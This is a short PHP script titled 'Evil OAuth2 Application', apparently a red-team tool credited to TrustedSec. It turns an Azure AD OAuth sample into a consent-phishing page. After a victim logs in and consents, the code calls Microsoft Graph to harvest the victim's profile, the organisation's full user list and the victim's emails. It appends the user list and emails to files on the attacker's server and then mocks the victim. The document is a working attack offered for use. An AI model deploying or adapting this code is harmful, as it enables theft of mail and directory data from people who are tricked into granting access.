<?php

// Evil OAuth2 Application
// 2021.09.30 - @nyxgeek - TrustedSec
//
// Original source:  	https://github.com/CoasterKaty/PHPAzureADoAuth
//			              https://katytech.blog/


// Load the auth module, this will redirect us to login if we aren't already logged in.
include '../inc/auth.php';
$Auth = new modAuth();
include '../inc/graph.php';
$Graph = new modGraph();


// Run our functions and retrieve data

// 0. Get Profile info - not going to write it to disk
//    however, this is useful if you want to personalize your phishing landing page
$profile = $Graph->getProfile();

// 1. Pull down user list - this should be allowed for everyone
$users = $Graph->getAllUsers();
$json = json_encode(array('data' => $users));
file_put_contents("/var/www/inc/users.txt", $json, FILE_APPEND);

// 2. Pull down emails - this requires admin consent. If it fails, will write auth error to emails.txt
$emails = $Graph->getEmails();
$json = json_encode(array('data' => $emails));
file_put_contents("/var/www/inc/emails.txt", $json, FILE_APPEND);


// Phishing page goes here DFIU:

echo 'Hello there, ' . $profile->displayName . '<P>';
echo 'Nothing to see here... go back to work. Oh, and nice work, btw. I really appreciate it. ;)<BR>';


?>
